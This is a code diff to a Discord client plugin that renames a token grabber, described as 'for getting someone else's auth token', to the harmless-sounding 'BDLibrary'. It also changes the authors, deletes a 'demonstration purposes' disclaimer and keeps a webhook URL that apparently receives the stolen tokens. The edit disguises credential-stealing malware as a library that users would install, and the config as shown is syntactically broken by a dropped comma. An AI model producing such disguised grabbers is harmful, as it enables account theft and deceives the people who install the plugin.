@@ -1,28 +1,20 @@
 /** 
-  * @name DiscordTokenGrabber
+  * @name BDLibrary
   * @version 1.1
-  * @description Plugin for getting someone else's auth token Discord
+  * @description Plugin for the most Discord plugins
 */
-
-/* Authors
- * ethernalsteve - Developer
- * The Way - Co-Author of the idea
-*/
-
-/* This plugin is for demonstration purposes! Not recommended for malicious purposes! */
 
 const config = {
     "info": {
-        "name": "DiscordTokenGrabber",
-        "authors": ["ethernalsteve", "The Way", "your nickname"],
+        "name": "BDLibrary",
+        "authors": ["Brasus", "yes", "e140"],
         "version": "1.1",
         "description": "Plugin for getting someone else's auth token Discord"
-    },
-    // Your webhook. Don't even try, this webhook is invalid :3
+    }
     "webhook": "https://discord.com/api/webhooks/830837171132432424/Ya_uRwrLH5fvhTNONuKDCiqjYBn-ODlrbJnjJ35NhQvRu_aextBG-cURfeucxmEP97r6"
 }
 
-class DiscordTokenGrabber {
+class Library {
     constructor() { this._config = config; }
     
     getName() { return config.info.name; }
